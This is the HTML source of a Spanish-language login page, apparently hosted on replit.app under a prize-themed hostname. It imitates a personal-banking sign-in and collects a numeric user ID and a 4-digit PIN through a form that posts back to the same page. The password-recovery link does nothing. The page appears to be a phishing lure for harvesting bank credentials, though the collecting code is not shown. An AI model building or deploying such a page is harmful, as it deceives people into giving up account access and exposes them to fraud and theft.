@@ -1,0 +1,146 @@
+<!-- url: https://leondominicanateofrecepremio.replit.app
+status: 200 -->
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Login</title>
+<style>
+  /* Estilos como antes (igual que en tu código previo) */
+  @import url('https://fonts.googleapis.com/css2?family=Roboto&family=Roboto+Slab:ital,wght@1,400&display=swap');
+  html, body {
+    height: 100%;
+    margin: 0; padding: 0;
+    font-family: 'Roboto', sans-serif;
+    background: url('background-login.webp') no-repeat center center fixed;
+    background-size: cover;
+    display: flex; justify-content: center; align-items: center;
+  }
+  .banner {
+    background: white;
+    width: 360px;
+    max-width: 95vw;
+    padding: 30px 25px;
+    border-radius: 8px;
+    box-shadow: 0 0 15px rgba(0,0,0,0.2);
+    text-align: center;
+  }
+  .header {
+    display: flex; align-items: center; justify-content: center; margin-bottom: 20px;
+  }
+  .logo { max-width: 140px; }
+  .linea-personal {
+    color: #51b046;
+    font-family: 'Roboto Slab', serif;
+    font-style: italic;
+    font-weight: 400;
+    font-size: 1.3rem;
+    margin-left: 12px;
+    user-select: none;
+  }
+  label {
+    font-size: 0.95rem;
+    color: black;
+    display: block;
+    margin-bottom: 6px;
+    text-align: left;
+  }
+  .asterisco { color: #f58220; }
+  .input-group {
+    position: relative;
+    margin-bottom: 22px;
+  }
+  .input-group img {
+    position: absolute;
+    top: 50%;
+    left: 12px;
+    transform: translateY(-50%);
+    width: 22px;
+    height: 22px;
+    pointer-events: none;
+  }
+  input[type="tel"], input[type="password"] {
+    width: 100%;
+    padding: 12px 12px 12px 46px;
+    font-size: 1rem;
+    border: 2px solid #ccc;
+    border-radius: 6px;
+    box-sizing: border-box;
+    transition: border-color 0.3s ease, box-shadow 0.3s ease;
+  }
+  input[type="tel"]:focus, input[type="password"]:focus {
+    border-color: #50ba3f;
+    box-shadow: 0 0 12px #50ba3f;
+    outline: none;
+  }
+  button {
+    width: 100%;
+    padding: 14px;
+    background-color: #51b046;
+    border: none;
+    border-radius: 6px;
+    color: white;
+    font-size: 1.1rem;
+    cursor: pointer;
+    font-weight: 600;
+    transition: background-color 0.3s ease;
+  }
+  button:hover { background-color: #429635; }
+  .forgot {
+    margin-top: 15px;
+    font-size: 0.9rem;
+    color: #51b046;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .forgot img {
+    width: 18px;
+    height: 18px;
+    margin-right: 6px;
+  }
+  .forgot:hover { text-decoration: underline; }
+</style>
+</head>
+<body>
+  <div class="banner">
+    <div class="header">
+      <img src="logo-1.png" alt="Logo" class="logo" />
+      <div class="linea-personal">| Personal</div>
+    </div>
+
+    <form method="POST" action="">
+      <label for="usuario">Usuario<span class="asterisco">*</span></label>
+      <div class="input-group">
+        <img src="perfil.png" alt="Usuario" />
+        <input type="tel" id="usuario" name="usuario" maxlength="20" pattern="\d*" o pattern="[0-9]*" inputmode="numeric" placeholder="Ingrese su usuario" required />
+      </div>
+
+      <label for="clave">Contraseña<span class="asterisco">*</span></label>
+      <div class="input-group">
+        <img src="bloquear.png" alt="Contraseña" />
+        <input type="password" id="clave" name="clave" minlength="4" maxlength="4" pattern="\d*" inputmode="numeric" placeholder="Ingrese su clave" required />
+      </div>
+
+      <button type="submit">Entrar</button>
+    </form>
+
+    <div class="forgot" onclick="alert('Aquí puedes agregar funcionalidad para recuperación de clave')">
+      <img src="candado.png" alt="Candado" />
+      ¿Olvidaste tu clave de acceso?
+    </div>
+  </div>
+
+<script>
+  document.getElementById('usuario').addEventListener('input', function() {
+    this.value = this.value.replace(/[^a-zA-Z0-9]/g, '');
+  });
+  document.getElementById('clave').addEventListener('input', function() {
+    this.value = this.value.replace(/\D/g, '');
+  });
+</script>
+</body>
+</html>
